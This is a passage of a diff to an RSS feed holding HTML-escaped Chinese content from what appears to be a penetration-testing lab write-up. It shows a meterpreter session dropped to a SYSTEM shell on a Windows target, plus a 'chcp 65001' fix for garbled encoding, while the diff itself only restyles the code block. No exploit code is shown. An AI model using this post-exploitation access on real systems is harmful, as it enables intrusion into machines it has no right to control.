 &lt;/h4&gt;&lt;p&gt;在&lt;code&gt;meterpreter&lt;/code&gt;下执行shell可以SYSTEM身份进入靶机终端。由于编码问题（Windows终端采用GBK编码，而Kali终端采用UTF-8编码）shell后可能出现乱码，可以通过指令修改靶机编码方式（&lt;code&gt;chcp 65001&lt;/code&gt;，Windows命令提示符(cmd)中设置代码页(Code Page)的命令）以解决该问题&lt;/p&gt;
+&lt;div class="leuco-codeblock" data-codeblock&gt;
+&lt;div class="leuco-codeblock__bar"&gt;
+&lt;span class="leuco-codeblock__lang"&gt;bash&lt;/span&gt;
+&lt;span class="leuco-codeblock__actions"&gt;
+&lt;button type="button" data-code-copy data-i18n-title="code.copy" aria-label="复制"&gt;复制&lt;/button&gt;
+&lt;button type="button" data-code-download data-code-lang="bash" data-i18n-title="code.download" aria-label="下载"&gt;下载&lt;/button&gt;
+&lt;/span&gt;
+&lt;/div&gt;
+&lt;div class="leuco-codeblock__body"&gt;
 &lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
 &lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
 &lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
@@ -2101,7 +2418,8 @@ data-flex-basis="333px"
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;exit
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;</description></item></channel></rss>
